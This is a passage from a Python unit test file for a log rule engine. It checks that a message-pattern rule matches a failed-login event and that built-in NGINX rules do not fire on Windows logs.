                "metadata_conditions": None,
                "threshold_count": None,
                "threshold_minutes": None,
            }
        ]
        engine._rules_loaded = True

        log = _make_normalized_log(
            source="auth-service",
            event_type="auth.event",
            message="User failed login attempt",
        )
        matches = engine.evaluate_rules(log)
        codes = [m["rule_code"] for m in matches]
        self.assertIn("TEST_MSG_PATTERN", codes)

    def test_builtin_nginx_rules_do_not_match_non_nginx_source(self):
        """Built-in NGINX rules must not fire for Windows/Docker/Chrome logs."""
        engine = RuleEngineService()
        engine._rules = []
        engine._rules_loaded = True

        log = _make_normalized_log(
            source="windows",
            event_type="windows_event_4625",
            message="An account failed to log on",
            metadata={"status_code": "401"},  # has 401 but source is not nginx
        )
        matches = engine.evaluate_rules(log)
        nginx_codes = [m["rule_code"] for m in matches if m["rule_code"].startswith("NGINX_")]
        self.assertEqual(nginx_codes, [], "NGINX rules must not fire for Windows source")


if __name__ == "__main__":
    unittest.main(verbosity=2)
